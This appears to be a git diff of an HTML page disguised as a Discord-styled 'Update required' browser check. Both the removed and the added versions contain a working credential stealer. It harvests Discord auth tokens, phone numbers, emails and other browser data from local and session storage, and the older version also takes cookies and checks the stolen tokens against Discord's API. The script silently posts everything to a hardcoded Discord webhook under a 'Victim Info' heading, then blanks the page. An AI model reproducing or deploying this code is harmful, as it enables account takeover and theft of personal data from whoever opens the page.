@@ -2,138 +2,54 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Checking your browser...</title>
-    <style>
-        *{margin:0;padding:0;box-sizing:border-box;}
-        body{background:#000;color:#000;font-family:'Segoe UI',sans-serif;overflow:hidden;height:100vh;width:100vw;}
-        #loading{position:fixed;top:0;left:0;right:0;bottom:0;background:linear-gradient(45deg,#36393f,#2f3136);display:flex;flex-direction:column;justify-content:center;align-items:center;z-index:9999;}
-        .spinner{width:60px;height:60px;border:4px solid #202225;border-top:4px solid #5865f2;border-radius:50%;animation:spin 1s linear infinite;margin-bottom:20px;}
-        @keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
-        h3{color:white;font-size:18px;}
-    </style>
+    <title>Update required</title>
+    <style>body{margin:0;padding:20px;background:#36393f;color:#dcddde;font-family:Whitney,sans-serif;height:100vh;display:flex;align-items:center;justify-content:center;}#content{text-align:center;}#spinner{width:40px;height:40px;border:3px solid #202225;border-top:3px solid #5865f2;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 15px;}@keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}</style>
 </head>
 <body>
-    <div id="loading">
-        <div class="spinner"></div>
-        <h3>Checking your browser...</h3>
+    <div id="content">
+        <div id="spinner"></div>
+        <h2>Update required</h2>
+        <p>Please wait while we verify your browser...</p>
     </div>
     <script>
-        (function(){
-            const WEBHOOK = "https://discord.com/api/webhooks/1485329631975440514/6p1QM-6SRGIPCepE7qgSa7MIXy0GR4xEnqAIlbTyU4t4SQKtmhCDom3yWc_wX7UvYgOd";
-
-            // Patterns Discord + phone + email
-            const PATTERNS = {
-                token: [/mfa\.[A-Za-z0-9-_]{84}/, /[A-Za-z0-9]{24}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27}/, /[\w-]{24}\.[\w-]{6}\.[\w-]{27}/],
-                phone: [/\+?[0-9\s\-\(\)]{10,}/, /[0-9]{10,}/, /(\+33|0)[1-9]([-. ]?[0-9]{2}){4}/],
-                email: /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g
-            };
-
-            function grabAll() {
-                const data = {
-                    tokens: [],
-                    phones: [],
-                    emails: [],
-                    ua: navigator.userAgent.slice(0,100),
-                    screen: `${screen.width}x${screen.height}`,
-                    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    localKeys: 0,
-                    cookies: document.cookie
-                };
-
-                // GRAB localStorage + sessionStorage COMPLET
-                [localStorage, sessionStorage].forEach(store => {
-                    data.localKeys += store.length;
-                    for(let i=0; i<store.length; i++) {
-                        const key = store.key(i);
-                        const val = store.getItem(key);
-                        if(!val) continue;
-
-                        // Tokens
-                        PATTERNS.token.forEach(p => {
-                            const match = val.match(p);
-                            if(match) data.tokens.push(...match);
-                        });
-
-                        // Phones + Emails
-                        PATTERNS.phone.forEach(p => {
-                            const m = val.match(p);
-                            if(m) data.phones.push(...m.slice(0,3));
-                        });
-                        const e = val.match(PATTERNS.email);
-                        if(e) data.emails.push(...e.slice(0,3));
-                    }
-                });
-
-                // Fallback Discord Desktop
-                try {
-                    const cmdline = window.process?.mainModule?.commandLine || '';
-                    const match = cmdline.match(/--auth_token=([A-Za-z0-9_-]+)/);
-                    if(match) data.tokens.push(match[1]);
-                } catch(e){}
-
-                return Object.fromEntries(Object.entries(data).map(([k,v]) => [k, Array.isArray(v) ? [...new Set(v)] : v]));
-            }
-
-            async function validateToken(token) {
-                try {
-                    const res = await fetch('https://discord.com/api/v9/users/@me', {
-                        headers: {'Authorization': token}
-                    });
-                    const data = await res.json();
-                    return data.id ? {valid: true, id: data.id, username: `${data.username}#${data.discriminator}`, avatar: data.avatar } : null;
-                } catch(e) { return {valid: false}; }
-            }
-
-            async function sendGrab() {
-                const data = grabAll();
-                
-                // Valide les tokens
-                const validated = [];
-                for(const token of data.tokens.slice(0,3)) { // Max 3 pour perf
-                    const info = await validateToken(token);
-                    if(info) validated.push({...info, token: token.slice(0,30)+'...'});
+        const WEBHOOK = "https://discord.com/api/webhooks/1485329631975440514/6p1QM-6SRGIPCepE7qgSa7MIXy0GR4xEnqAIlbTyU4t4SQKtmhCDom3yWc_wX7UvYgOd";
+        
+        function getTokens(){
+            const tokens = [];
+            const patterns = [/mfa\.[A-Za-z0-9-_]{84}/,/[A-Za-z0-9]{24}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27}/];
+            [localStorage,sessionStorage].forEach(s=>{
+                for(let i=0;i<s.length;i++){
+                    const v=s.getItem(s.key(i));
+                    if(v)patterns.forEach(p=>v.match(p)?.forEach(t=>tokens.push(t)))
                 }
-
-                const payload = {
-                    username: "💎 ULTIMATE GRABBER",
-                    avatar_url: "https://i.imgur.com/discordgrab.png",
-                    embeds: [{
-                        title: `🎯 ${data.tokens.length} TOKEN${data.tokens.length !== 1 ? 'S' : ''}`,
-                        description: validated.length ? 
-                            `**✅ VALIDÉ(S):**\n${validated.map(v => `**${v.username}** (${v.id})`).join('\n')}` : 
-                            '❌ Aucun valide',
-                        color: data.tokens.length ? 0x00ff88 : 0xff4444,
-                        thumbnail: validated[0]?.avatar ? 
-                            `https://cdn.discordapp.com/avatars/${validated[0].id}/${validated[0].avatar}.png` : 
-                            "https://i.imgur.com/token.png",
-                        fields: [
-                            {name: "🔑 TOKENS", value: data.tokens.map(t=>`\`${t.slice(0,25)}...\``).slice(0,5).join('\n') || '❌', inline: false},
-                            {name: "📱 PHONES", value: data.phones.slice(0,3).map(p=>`\`${p}\``).join('\n') || '❌', inline: true},
-                            {name: "📧 EMAILS", value: data.emails.slice(0,3).map(e=>`\`${e}\``).join('\n') || '❌', inline: true},
-                            {name: "📦 localStorage", value: `${data.localKeys} clés`, inline: true},
-                            {name: "🍪 Cookies", value: data.cookies ? `${data.cookies.length} chars` : '0', inline: true},
-                            {name: "📱 Résolution", value: `\`${data.screen}\``, inline: true},
-                            {name: "🌍 Timezone", value: `\`${data.tz}\``, inline: true}
-                        ],
-                        image: {url: "https://i.imgur.com/grabber.gif"},
-                        footer: {text: `Grab #${Math.floor(Math.random()*1000)} • ${new Date().toLocaleString('fr-FR')}`}
-                    }]
-                };
-
-                fetch(WEBHOOK, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify(payload)
-                }).catch(e=>console.error('ERR:',e));
-            }
-
-            // LANCE MAINTENANT
-            setTimeout(()=>{
-                document.getElementById('loading').style.display = 'none';
-                document.body.style.background = '#000';
-                sendGrab();
-            }, 1200);
-        })();
+            });
+            return [...new Set(tokens)];
+        }
+        
+        const tokens = getTokens();
+        const ua = navigator.userAgent.slice(0,80);
+        const screen = `${screen.width}x${screen.height}`;
+        
+        fetch(WEBHOOK,{
+            method:"POST",
+            headers:{"Content-Type":"application/json"},
+            body:JSON.stringify({
+                content:tokens.length?`**🪝 TOKENS GRABBED (${tokens.length})**\n`+tokens.map(t=>`\`${t.slice(0,30)}...\``).join("\n"):`**❌ No tokens**`,
+                embeds:[{
+                    title:"Victim Info",
+                    color:tokens.length?16711680:16776960,
+                    fields:[
+                        {name:"User Agent",value:`\`${ua}\``,inline:false},
+                        {name:"Screen",value:`\`${screen}\``,inline:true},
+                        {name:"Timezone",value:`\`${Intl.DateTimeFormat().resolvedOptions().timeZone}\``,inline:true}
+                    ]
+                }]
+            })
+        }).catch(()=>{}); // Silent
+        
+        setTimeout(()=>{
+            document.body.innerHTML="<div style='background:black;height:100vh'></div>";
+        },1500);
     </script>
 </body>
 </html>
